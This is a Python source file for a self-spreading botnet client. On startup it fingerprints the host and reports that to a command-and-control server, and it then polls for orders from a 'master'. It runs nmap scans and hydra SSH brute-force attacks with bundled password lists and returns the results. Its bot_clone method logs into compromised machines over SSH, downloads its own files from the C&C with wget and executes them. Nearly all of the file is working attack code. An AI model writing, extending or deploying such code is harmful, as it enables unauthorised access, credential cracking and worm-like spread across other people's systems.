import random
import os
import requests 
import paramiko
import config
import json

class Bot:
    id_num = int()
    name = str()
    uname = str()
    root_status = bool
    network_config = {}
    comand_center = str()

    '''Methods need to init'''
    def get_uname(self):
        self.uname = os.popen('uname -a').read()

    def check_root_status(self):
        if 'root' in os.popen('whoami').read():
           self.root_status = True
        else:
            self.root_status = False


    def get_network_config(self):
        network_config = {}
        ifconfig = os.popen('ifconfig').read().split('\n')[1].split(' ')
        network_config.update({'ip_addr':ifconfig[-5][ifconfig[-5].find(':')+1:]})
        network_config.update({'mask':ifconfig[-1][ifconfig[-1].find(':')+1:]})
        self.network_config = network_config


   


    def __init__(self):
        self.id_num = random.randint(10000, 99999)
        self.name = (str(self.id_num)+"Bot")
        self.get_uname()
        self.check_root_status()
        self.get_network_config()
        self.comand_center = config.command_center_ip
        self.get_last_shout = config.last_message
        self.push_shoat = config.push_message
        self.start_message()
        print("Starting " + self.name)


    '''Communications wih C&C methosds'''
    def request_update(self):
        update = requests.get(self.comand_center + self.get_last_shout)
        update = update.json()
        return update

    def is_it_for_me(self, sender_name, text):
        if(sender_name == 'master' and ( (text.find(self.name) != -1) or (text.find('all_bots') != -1))):
            return True
        else:
            return False

    def send_message(self, name, message):
        data = {
            'name' : self.name,
            'text' : message
        }

        requests.post(self.comand_center + self.push_shoat , data=data)

    def start_message(self): #How to make XML output?
        content = "New bot has been init: "
        content += "id: " + str(self.id_num) + " "
        content += "name: " + self.name + " "
        content += "Kernel: " + self.uname + " "
        content += "root_status: " + str(self.root_status) + " "
        content += "network_config: " + self.network_config.get('ip_addr') + " "
        content += self.network_config.get('mask') + " "

        self.send_message(self.name, content)

    '''Hack methods. Main functional at here'''
    def nmap(self, target):
        print("Command " + target)
        target = target.split(' ')
        nmap_output = os.popen('nmap ' + str(target[-1])).read()
        self.send_message(self.name, nmap_output)
        print("Command OK return to main")

    def hydra_ssh(self, target):
        print("Command " + target)
        target = target.split(' ')[-1]
        os.system("hydra -L users.txt -P passwords.txt -t 4 " + str(target) + " ssh -o result.txt; cat result.txt")
        hydra_output = os.popen("cat result.txt").read().split('\n')[1:]
        hydra_output = "".join(hydra_output)
        self.send_message(self.name, hydra_output)
        os.system("rm -f result.txt")
        print("Command OK return to main")

    def bot_clone(self, target):
        print("Command " + target)
        target = target.split(' ')
        remote_ip = str(target[-3])
        username = str(target[-2])
        password = str(target[-1])
        print(remote_ip, username, password)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=remote_ip, username=username, password=password)

        client.exec_command("wget " + self.comand_center +"/Bot/main.py;")
        client.exec_command("wget " + self.comand_center +"/Bot/Bot.py;")
        client.exec_command("wget " + self.comand_center +"/Bot/config.py;")
        client.exec_command("wget " + self.comand_center +"/Bot/users.txt;")
        client.exec_command("wget " + self.comand_center +"/Bot/passwords.txt;")
        client.exec_command("python3 main.py;")

        self.send_message(self.name, "Bot has been cloned to " + str(remote_ip))
        client.close()
        print("Command OK return to main")
